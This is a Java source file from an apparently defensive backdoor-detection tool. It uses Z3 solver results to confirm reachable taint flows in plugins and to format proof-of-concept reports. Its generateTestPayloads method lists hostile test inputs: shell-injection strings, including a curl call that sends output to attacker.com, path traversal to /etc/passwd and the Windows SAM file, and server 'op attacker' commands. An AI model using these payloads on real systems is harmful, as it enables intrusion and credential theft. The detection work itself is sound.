package backdoordetected.detection;

import backdoordetected.analyzers.SymbolicAnalyzer;
import backdoordetected.models.SuspiciousMethod;
import backdoordetected.models.TaintFlow;
import backdoordetected.models.Z3Result;
import backdoordetected.utils.StandaloneLogger;
import java.nio.file.Path;
import java.util.*;
import java.util.logging.Logger;

public class TaintConstraintGenerator {

  private static final Logger logger = StandaloneLogger.getLogger();
  private final SymbolicAnalyzer symbolicAnalyzer = new SymbolicAnalyzer();

  public TaintProof generateProof(TaintFlow flow, Path pluginPath) {
    if (!"CRITICAL".equals(flow.severity())) {
      return null;
    }

    logger.info("[Z3] Generating proof for taint flow: " + flow.source() + " -> " + flow.sink());

    try {

      String sourceMethod = flow.source();
      String[] parts = sourceMethod.split("\\(")[0].split("\\.");
      if (parts.length < 2) {
        return new TaintProof(flow, false, null, "Cannot parse method signature");
      }

      String className = parts[0];
      String methodName = parts[1];
      String methodSig = sourceMethod.contains("(") ? sourceMethod.substring(sourceMethod.indexOf("(")) : "()";

      SuspiciousMethod suspiciousMethod = new SuspiciousMethod(className, methodName, methodSig, flow.sink(), 0,
          "CRITICAL");

      Z3Result z3Result = symbolicAnalyzer.analyzeWithCFG(pluginPath, suspiciousMethod);

      if (z3Result == null) {
        return new TaintProof(flow, false, null, "Z3 analysis failed");
      }

      if (!z3Result.isBackdoorConfirmed()) {
        logger.info("[Z3] Taint flow is UNSATISFIABLE - path unreachable");
        return new TaintProof(flow, false, null, "Path is unreachable: " + z3Result.explanation());
      }

      String payload = extractPayloadFromModel(z3Result.model());
      logger.warning("[Z3] PROOF GENERATED: " + payload);

      return new TaintProof(flow, true, payload, z3Result.explanation());

    } catch (Exception e) {
      logger.warning("[Z3] Failed to generate proof: " + e.getMessage());
      return new TaintProof(flow, false, null, "Error: " + e.getMessage());
    }
  }

  private String extractPayloadFromModel(Map<String, String> model) {
    if (model == null || model.isEmpty()) {
      return "SATISFIABLE (no concrete values)";
    }
    Map<String, String> reconstructed = new HashMap<>();

    for (Map.Entry<String, String> entry : model.entrySet()) {
      String key = entry.getKey();
      String value = entry.getValue();
      String concrete = reconstructStringFromZ3(value);
      reconstructed.put(key, concrete);
    }
    StringBuilder payload = new StringBuilder();
    String mainInput = reconstructed.entrySet().stream()
        .filter(e -> e.getKey().contains("user_input_0") || e.getKey().contains("param0"))
        .map(Map.Entry::getValue)
        .findFirst()
        .orElse(null);

    if (mainInput != null && !mainInput.isEmpty()) {
      payload.append(mainInput);
    } else {
      for (Map.Entry<String, String> entry : reconstructed.entrySet()) {
        payload.append(entry.getKey()).append("=").append(entry.getValue()).append("; ");
      }
    }

    return payload.toString().trim();
  }

  private String reconstructStringFromZ3(String z3Value) {
    if (z3Value == null || z3Value.isEmpty()) {
      return "";
    }

    if (z3Value.startsWith("\"") && z3Value.endsWith("\"")) {
      return z3Value.substring(1, z3Value.length() - 1);
    }

    if (z3Value.contains("seq.++") || z3Value.contains("str.to_re")) {
      return extractStringFromSeq(z3Value);
    }

    if ("true".equals(z3Value) || "false".equals(z3Value)) {
      return z3Value;
    }

    try {
      Integer.parseInt(z3Value);
      return z3Value;
    } catch (NumberFormatException ignored) {
    }
    if (z3Value.matches(".*[!_]\\d+$")) {
      return generatePlausibleValue(z3Value);
    }

    return z3Value;
  }

  private String extractStringFromSeq(String seqExpr) {
    StringBuilder result = new StringBuilder();

    int pos = 0;
    while (pos < seqExpr.length()) {
      int quoteStart = seqExpr.indexOf('"', pos);
      if (quoteStart == -1)
        break;

      int quoteEnd = seqExpr.indexOf('"', quoteStart + 1);
      if (quoteEnd == -1)
        break;

      result.append(seqExpr, quoteStart + 1, quoteEnd);
      pos = quoteEnd + 1;
    }

    return result.toString();
  }

  private String generatePlausibleValue(String symbolicName) {
    if (symbolicName.contains("user_input") || symbolicName.contains("param")) {
      return "ATTACKER_INPUT";
    }
    return "<" + symbolicName + ">";
  }

  public List<String> generateTestPayloads(TaintFlow flow) {
    List<String> payloads = new ArrayList<>();

    String sink = flow.sink().toLowerCase();

    if (sink.contains("runtime.exec") || sink.contains("processbuilder")) {
      payloads.add("; whoami");
      payloads.add("| whoami");
      payloads.add("&& whoami");
      payloads.add("`whoami`");
      payloads.add("$(whoami)");
      payloads.add("; curl attacker.com/$(whoami)");
    }

    if (sink.contains("class.forname") || sink.contains("method.invoke")) {
      payloads.add("java.lang.Runtime");
      payloads.add("java.lang.ProcessBuilder");
      payloads.add("sun.misc.Unsafe");
    }

    if (sink.contains("filewriter") || sink.contains("files.write")) {
      payloads.add("../../../etc/passwd");
      payloads.add("..\\..\\..\\windows\\system32\\config\\sam");
      payloads.add("/tmp/backdoor.sh");
    }

    if (sink.contains("dispatchcommand") || sink.contains("performcommand")) {
      payloads.add("op attacker");
      payloads.add("give attacker diamond 64");
      payloads.add("execute as @a run op attacker");
    }

    return payloads;
  }

  public record TaintProof(
      TaintFlow flow, boolean exploitable, String payload, String explanation) {
    public String toFormattedString() {
      StringBuilder sb = new StringBuilder();
      sb.append("\n╔════════════════════════════════════════════════════════╗\n");
      sb.append("║ Z3 PROOF-OF-CONCEPT\n");
      sb.append("╠════════════════════════════════════════════════════════╣\n");
      sb.append("║ Source: ").append(flow.source()).append("\n");
      sb.append("║ Sink: ").append(flow.sink()).append("\n");
      sb.append("║ Severity: ").append(flow.severity()).append("\n");
      sb.append("║ Exploitable: ").append(exploitable ? "YES " : "NO ✓").append("\n");

      if (payload != null && !payload.isEmpty()) {
        sb.append("║ \n");
        sb.append("║ PROOF-OF-CONCEPT PAYLOAD:\n");

        if (payload.contains("\n") || payload.contains(";")) {
          String[] payloads = payload.split("[;\n]");
          for (int i = 0; i < Math.min(payloads.length, 5); i++) {
            String p = payloads[i].trim();
            if (!p.isEmpty()) {
              sb.append("║   ").append(i + 1).append(". ").append(p).append("\n");
            }
          }
        } else {
          sb.append("║   ").append(payload).append("\n");
        }
      }

      sb.append("║ Explanation: ").append(explanation).append("\n");

      if (exploitable) {
        sb.append("╠════════════════════════════════════════════════════════╣\n");
        sb.append("║ WARNING: This backdoor is CONFIRMED EXPLOITABLE\n");
        sb.append("║ Z3 solver verified that the taint path is reachable\n");
        sb.append("║ The generated payload(s) can trigger this backdoor\n");
      }

      sb.append("╚════════════════════════════════════════════════════════╝");
      return sb.toString();
    }

    public String toShortString() {
      return String.format(
          "[Z3-%s] %s -> %s: %s",
          exploitable ? "EXPLOIT" : "SAFE",
          flow.source().split("\\.")[flow.source().split("\\.").length - 1],
          flow.sink().split("/")[flow.sink().split("/").length - 1],
          exploitable ? payload : "unreachable");
    }
  }
}
